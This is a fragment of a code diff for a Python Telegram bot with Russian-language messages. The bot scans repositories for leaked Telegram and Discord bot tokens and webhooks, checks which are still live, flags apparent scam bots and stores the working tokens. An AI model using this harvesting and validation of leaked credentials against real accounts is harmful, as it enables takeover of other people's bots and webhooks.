         f"📟 <b>Консоль событий ({MAX_LOG_LINES} строк):</b>\n"
@@ -1880,22 +2125,8 @@ def process_single_finding(finding: Dict[str, str], chat_id: int) -> None:
     repo = finding.get("repo", "unknown")
     url = finding.get("url", "")
 
-    err_reason: Optional[str] = None
-    bot_name: Optional[str] = None
-    is_live = False
-    is_scam = False
-    dossier = ""
-
-    if f_type == "Telegram":
-        is_live, bot_name, is_scam, dossier, err_reason = check_telegram_token(token)
-    elif f_type == "Discord":
-        is_live, bot_name, is_scam, dossier, err_reason = check_discord_token(token)
-    elif f_type == "Webhook":
-        is_live, bot_name, err_reason = check_discord_webhook(token)
-        is_scam = True
-        dossier = "🪝 Активный Discord Webhook (часто используется для слива данных)"
-    else:
-        return
+    add_log(f"🔎 Проверяю {f_type} из {repo}...")
+    is_live, bot_name, is_scam, dossier, err_reason = check_finding_hard_timeout(f_type, token)
 
     with state_lock:
         search_state["checked_tokens"] += 1
@@ -1970,6 +2201,7 @@ def process_single_finding(finding: Dict[str, str], chat_id: int) -> None:
 def _build_final_summary(snap: Dict[str, Any]) -> str:
     status_final = html.escape(str(snap["status_text"]))
     filter_final = html.escape(FILTER_MODES.get(snap["filter_mode"], snap["filter_mode"]))
+    hunt_final = html.escape(HUNT_MODES.get(snap["hunt_mode"], snap["hunt_mode"]))
     elapsed_str = html.escape(snap["time"])
     total_db = len(load_live_tokens())
 
@@ -1977,6 +2209,7 @@ def _build_final_summary(snap: Dict[str, Any]) -> str:
         f"🏁 <b>Поиск завершён — Сводный отчёт</b>\n\n"
         f"📌 Причина: <code>{status_final}</code>\n"
         f"⏱ Длительность: <code>{elapsed_str}</code>\n"
+        f"🎯 Охота: <code>{hunt_final}</code>\n"
         f"🎛 Фильтр сессии: <code>{filter_final}</code>\n\n"
         f"🔍 Всего проверено: <code>{snap['checked_tokens']}</code>\n"
         f"🟢 Принято живых: <code>{snap['found_live_current']}</code>\n"
@@ -2024,9 +2257,9 @@ def run_search_task(chat_id: int, msg_id: int) -> None:
                     executor.submit(process_single_finding, item, chat_id)
                     for item in raw_findings
                 ]
-                for fut in concurrent.futures.as_completed(futures, timeout=25):
+                for fut in concurrent.futures.as_completed(futures, timeout=30):
                     try:
-                        fut.result(timeout=4)
+                        fut.result(timeout=CHECK_HARD_TIMEOUT + 2.0)
                     except Exception as exc:
                         add_log(f"⚠️ Ошибка воркера: {exc}")
 
